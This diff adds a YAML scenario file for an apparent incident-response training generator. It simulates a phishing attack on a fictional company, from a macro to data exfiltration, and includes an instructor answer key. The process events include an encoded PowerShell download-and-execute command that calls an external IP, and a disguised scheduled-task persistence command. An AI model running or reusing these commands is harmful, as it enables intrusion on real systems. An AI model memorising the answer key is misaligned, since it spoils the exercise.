@@ -1,0 +1,405 @@
+# ForgeIncident scenario file
+# =============================================================================
+# HOW THIS FILE WORKS (read this before writing your own scenario):
+#
+#   * `seed` is the master seed for reproducibility. `forge-incident generate`
+#     can override it with --seed, but every other part of the story below
+#     stays identical — only small timestamp jitter and any future
+#     emitter-level "noise" events change.
+#
+#   * `start_time` is the anchor for the whole timeline. Every event under
+#     `timeline:` sets `at:` to an OFFSET from start_time, e.g. "+14m" means
+#     "14 minutes after start_time". Supported units: d, h, m, s, combinable
+#     (e.g. "+1h30m"). You can also give an absolute ISO-8601 timestamp
+#     instead of an offset if you need to pin something exactly.
+#
+#   * `actors` and `hosts` are short-key registries. Every `actor:`/`host:`
+#     field on a timeline event must reference a key defined here — the
+#     loader will refuse to load the file otherwise. This is what keeps a
+#     username or IP address identical across the Windows log, the Palo
+#     Alto log, and the .eml file: they all resolve the same key.
+#
+#   * Each timeline event declares `log_sources:` — which emitter(s) should
+#     render it (gcp_audit, outlook_message_trace, palo_alto, linux,
+#     windows, email_eml). Only include the typed payload block(s)
+#     (`email:`, `network:`, `process:`, `cloud:`, `file:`) that those
+#     emitters actually need.
+#
+#   * Giving a timeline event an explicit `id:` (short and readable) is
+#     optional but recommended — it's what `answer_key.related_event_ids`
+#     references, and it's far easier to read than an auto-generated
+#     "<scenario_id>::0007".
+# =============================================================================
+
+scenario_id: phishing-to-exfil-01
+title: "Phishing to Data Exfiltration"
+description: >
+  A finance analyst at Globex Corporation opens a malicious invoice
+  attachment from a spearphishing email. The macro drops a PowerShell
+  stager that beacons to an external C2 server, establishes persistence,
+  moves laterally to the finance file server using the analyst's cached
+  credentials, stages sensitive files, and exfiltrates them over HTTPS.
+  Students correlate Outlook message trace, a recovered .eml, Windows
+  Sysmon-style process telemetry, and Palo Alto firewall logs to
+  reconstruct the full kill chain.
+
+# Shown to students verbatim in their package README — must NOT reveal the
+# attack chain above. Scopes the investigation the way a real engagement
+# kickoff would: who/what systems are in scope, what evidence they have,
+# and what questions to answer. See scenario_loader.py / packager.py for
+# how `description` (instructor-only) and `student_briefing` are kept separate.
+student_briefing: >
+  Globex Corporation's IT helpdesk received a report from Jane Smith
+  (Finance, jsmith@globex.example) that her workstation, FIN-WS-014, has
+  been running slowly and that she noticed an unfamiliar scheduled task.
+  Around the same time, the SOC flagged an EDR alert on FIN-WS-014 for
+  suspicious PowerShell activity. You have been provided the
+  organization's Exchange Online message trace, a .eml message
+  recovered from Jane's mailbox, Windows event logs from FIN-WS-014 and
+  the finance file server (FIN-FILE-SRV02), and Palo Alto firewall
+  traffic logs covering the incident window (2026-03-10, 08:00-11:00
+  UTC).
+
+  Your task: determine how the attacker first gained access, what they
+  did on each affected host, whether any data left the network, and if
+  so, how much and to where.
+difficulty: intermediate
+version: "1.0"
+seed: 20260310
+
+organization:
+  name: Globex Corporation
+  domain: globex.example
+  industry: Manufacturing
+  timezone: UTC
+  gcp_project_id: globex-prod-01
+
+mitre_tactics:
+  - Initial Access
+  - Execution
+  - Persistence
+  - Lateral Movement
+  - Collection
+  - Exfiltration
+
+learning_objectives:
+  - Identify a phishing email's initial access vector from message trace and .eml headers
+  - Correlate a malicious Office macro to the child process it spawns
+  - Trace a C2 beacon through Palo Alto firewall logs by IP and App-ID
+  - Recognize scheduled-task persistence in Windows telemetry
+  - Follow lateral movement from a workstation to a file server via reused credentials
+  - Identify the exfiltration event and quantify data loss from firewall byte counts
+
+tags: [phishing, malware, c2, lateral-movement, exfiltration, windows]
+
+start_time: "2026-03-10T08:00:00Z"
+
+actors:
+  victim:
+    username: jsmith
+    email: jsmith@globex.example
+    display_name: Jane Smith
+    department: Finance
+    role_title: Senior Financial Analyst
+    employee_id: GX-10432
+  attacker:
+    username: unknown
+    email: billing@invoice-notify-secure.example
+    display_name: Unattributed External Actor
+    is_compromised: true
+
+hosts:
+  ws-01:
+    hostname: FIN-WS-014
+    ip_address: 10.20.30.14
+    host_type: workstation
+    os: windows
+    os_version: "Windows 11 23H2"
+    mac_address: "00:1A:2B:3C:4D:5E"
+  fs-01:
+    hostname: FIN-FILE-SRV02
+    ip_address: 10.20.10.5
+    host_type: server
+    os: windows
+    os_version: "Windows Server 2022"
+    mac_address: "00:1A:2B:9F:11:02"
+
+timeline:
+  - id: delivered
+    at: "+0m"
+    event_type: phishing_email_delivered
+    log_sources: [outlook_message_trace, email_eml]
+    severity: low
+    actor: victim
+    host: ws-01
+    description: >
+      Spearphishing email with a malicious macro-enabled spreadsheet
+      attachment delivered to jsmith@globex.example, spoofing an overdue
+      invoice notice. SPF and DMARC fail; DKIM is absent.
+    mitre:
+      technique_id: T1566.001
+      technique_name: Spearphishing Attachment
+      tactic: Initial Access
+    email:
+      message_id: "<8f2c9e10-3a41-4b7e-9c2a-441f0a7b9d21@invoice-notify-secure.example>"
+      sender: billing@invoice-notify-secure.example
+      recipients: [jsmith@globex.example]
+      subject: "Overdue Invoice #4471 - Immediate Action Required"
+      direction: inbound
+      spf: fail
+      dkim: none
+      dmarc: fail
+      has_attachment: true
+      attachment_name: invoice_4471.xlsm
+      attachment_sha256: "a3f1c9d2e6b4785a0f9c2d1e4b6a8c3d5e7f9a1b3c5d7e9f1a3b5c7d9e1f3a5b"
+      body_text: >
+        Please review and process the attached overdue invoice at your
+        earliest convenience. Enable content to view the statement.
+      client_ip: "185.220.101.47"
+      size_bytes: 48210
+
+  - id: opened
+    at: "+14m"
+    event_type: attachment_opened
+    log_sources: [windows]
+    severity: medium
+    actor: victim
+    host: ws-01
+    description: >
+      Jane Smith opens invoice_4471.xlsm and clicks "Enable Content",
+      allowing the embedded macro to run.
+    mitre:
+      technique_id: T1204.002
+      technique_name: "User Execution: Malicious File"
+      tactic: Execution
+    process:
+      pid: 4820
+      ppid: 3196
+      name: EXCEL.EXE
+      command_line: '"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE" "C:\Users\jsmith\Downloads\invoice_4471.xlsm"'
+      parent_name: explorer.exe
+      integrity_level: Medium
+
+  - id: macro-exec
+    at: "+15m"
+    event_type: process_created
+    log_sources: [windows]
+    severity: high
+    actor: victim
+    host: ws-01
+    description: >
+      The macro spawns a hidden PowerShell process that decodes and runs
+      an embedded stager, downloading the next-stage payload into memory.
+    mitre:
+      technique_id: T1059.001
+      technique_name: "Command and Scripting Interpreter: PowerShell"
+      tactic: Execution
+    process:
+      pid: 5566
+      ppid: 4820
+      name: powershell.exe
+      command_line: 'powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADcALwBzAC8AcwB0AGEAZwBlAC4AcABzADEAIgApAA=='
+      parent_name: EXCEL.EXE
+      sha256: "c7d4e9f2a1b3c5d7e9f1a3b5c7d9e1f3a5b7c9d1e3f5a7b9c1d3e5f7a9b1c3d5"
+      integrity_level: Medium
+
+  - id: c2-beacon
+    at: "+16m"
+    event_type: c2_beacon
+    log_sources: [palo_alto]
+    severity: high
+    actor: victim
+    host: ws-01
+    description: >
+      FIN-WS-014 begins periodic HTTPS beaconing to an external C2 host on
+      port 443, consistent with the stager downloaded by the PowerShell
+      process.
+    mitre:
+      technique_id: T1071.001
+      technique_name: "Application Layer Protocol: Web Protocols"
+      tactic: Command and Control
+    network:
+      protocol: tcp
+      src_ip: 10.20.30.14
+      src_port: 51422
+      dst_ip: 185.220.101.47
+      dst_port: 443
+      action: allow
+      app: ssl
+      rule_name: ALLOW-OUTBOUND-WEB
+      bytes_sent: 4320
+      bytes_received: 118940
+
+  - id: persistence
+    at: "+55m"
+    event_type: persistence_established
+    log_sources: [windows]
+    severity: high
+    actor: victim
+    host: ws-01
+    description: >
+      A scheduled task is created to relaunch the PowerShell stager on
+      every logon, ensuring the implant survives a reboot.
+    mitre:
+      technique_id: T1053.005
+      technique_name: "Scheduled Task/Job: Scheduled Task"
+      tactic: Persistence
+    process:
+      pid: 5901
+      ppid: 5566
+      name: schtasks.exe
+      command_line: 'schtasks.exe /Create /SC ONLOGON /TN "MicrosoftEdgeUpdateTaskCore" /TR "powershell.exe -W Hidden -File C:\Users\jsmith\AppData\Roaming\update.ps1" /RL HIGHEST'
+      parent_name: powershell.exe
+
+  - id: lateral-move
+    at: "+2h05m"
+    event_type: lateral_movement
+    log_sources: [windows, palo_alto]
+    severity: high
+    actor: victim
+    host: fs-01
+    description: >
+      Using Jane Smith's cached domain credentials, the attacker
+      authenticates to the finance file server over SMB from the
+      compromised workstation.
+    mitre:
+      technique_id: T1021.002
+      technique_name: "Remote Services: SMB/Windows Admin Shares"
+      tactic: Lateral Movement
+    network:
+      protocol: tcp
+      src_ip: 10.20.30.14
+      src_port: 49721
+      dst_ip: 10.20.10.5
+      dst_port: 445
+      action: allow
+      app: ms-ds-smbv3
+      rule_name: ALLOW-INTERNAL-FILESHARE
+
+  - id: login-fs01
+    at: "+2h07m"
+    event_type: account_login_success
+    log_sources: [windows]
+    severity: medium
+    actor: victim
+    host: fs-01
+    description: >
+      An interactive-equivalent network logon for jsmith succeeds on
+      FIN-FILE-SRV02 from FIN-WS-014 — outside Jane Smith's normal
+      working pattern for this server.
+    mitre:
+      technique_id: T1078
+      technique_name: "Valid Accounts"
+      tactic: Lateral Movement
+
+  - id: staging
+    at: "+2h30m"
+    event_type: data_staging
+    log_sources: [windows]
+    severity: high
+    actor: victim
+    host: fs-01
+    description: >
+      Quarterly financial statements and vendor banking records are
+      copied from the finance share into a hidden staging directory in
+      preparation for exfiltration.
+    mitre:
+      technique_id: T1074.001
+      technique_name: "Data Staged: Local Data Staging"
+      tactic: Collection
+    file:
+      path: 'C:\ProgramData\.cache\staging.zip'
+      filename: staging.zip
+      sha256: "e1f3a5b7c9d1e3f5a7b9c1d3e5f7a9b1c3d5e7f9a1b3c5d7e9f1a3b5c7d9e1f3"
+      size_bytes: 187342551
+
+  - id: exfil
+    at: "+2h45m"
+    event_type: data_exfiltration
+    log_sources: [palo_alto]
+    severity: critical
+    actor: victim
+    host: fs-01
+    description: >
+      staging.zip is uploaded from the file server to the same external
+      C2 infrastructure over HTTPS — roughly 178 MB leaves the network in
+      under two minutes.
+    mitre:
+      technique_id: T1041
+      technique_name: "Exfiltration Over C2 Channel"
+      tactic: Exfiltration
+    network:
+      protocol: tcp
+      src_ip: 10.20.10.5
+      src_port: 52117
+      dst_ip: 185.220.101.47
+      dst_port: 443
+      action: allow
+      app: ssl
+      rule_name: ALLOW-OUTBOUND-WEB
+      bytes_sent: 187342551
+      bytes_received: 8120
+
+  - id: alert
+    at: "+3h00m"
+    event_type: alert_triggered
+    log_sources: [windows]
+    severity: critical
+    host: ws-01
+    description: >
+      EDR raises a high-confidence alert for anomalous encoded
+      PowerShell execution originating from EXCEL.EXE, three hours after
+      the initial detonation.
+    mitre:
+      technique_id: T1059.001
+      technique_name: "Command and Scripting Interpreter: PowerShell"
+      tactic: Execution
+
+answer_key:
+  - id: q1
+    question: "What was the initial access vector, and what evidence indicates it was spoofed?"
+    answer: >
+      A spearphishing email with a macro-enabled attachment
+      (invoice_4471.xlsm), sent from billing@invoice-notify-secure.example.
+      SPF and DMARC both fail and DKIM is absent, indicating the sending
+      domain does not authorize this mail server to send on its behalf.
+    related_event_ids: [delivered]
+    points: 2
+
+  - id: q2
+    question: "Which process spawned the malicious PowerShell process, and what does that tell you?"
+    answer: >
+      EXCEL.EXE (pid 4820) spawned powershell.exe (pid 5566). Office
+      applications spawning script interpreters is a strong indicator of
+      macro-based execution.
+    related_event_ids: [opened, macro-exec]
+    points: 2
+
+  - id: q3
+    question: "What external IP is the C2 server, and what evidence ties it to both delivery and exfiltration?"
+    answer: >
+      185.220.101.47. It is the client IP that sent the phishing email,
+      the destination of the PowerShell C2 beacon, and the destination of
+      the final 178 MB exfiltration transfer — the same identifier
+      appears consistently across the .eml headers and both Palo Alto
+      log entries.
+    related_event_ids: [delivered, c2-beacon, exfil]
+    points: 3
+
+  - id: q4
+    question: "How did the attacker move from the workstation to the file server?"
+    answer: >
+      Using Jane Smith's own cached domain credentials over SMB (port
+      445) from FIN-WS-014 to FIN-FILE-SRV02, followed by a successful
+      network logon as jsmith on the file server.
+    related_event_ids: [lateral-move, login-fs01]
+    points: 2
+
+  - id: q5
+    question: "Approximately how much data was exfiltrated, and how do you know?"
+    answer: >
+      Approximately 178 MB (187,342,551 bytes), read directly from the
+      bytes_sent field of the Palo Alto exfiltration log entry, matching
+      the size of staging.zip staged on the file server minutes earlier.
+    related_event_ids: [staging, exfil]
+    points: 1
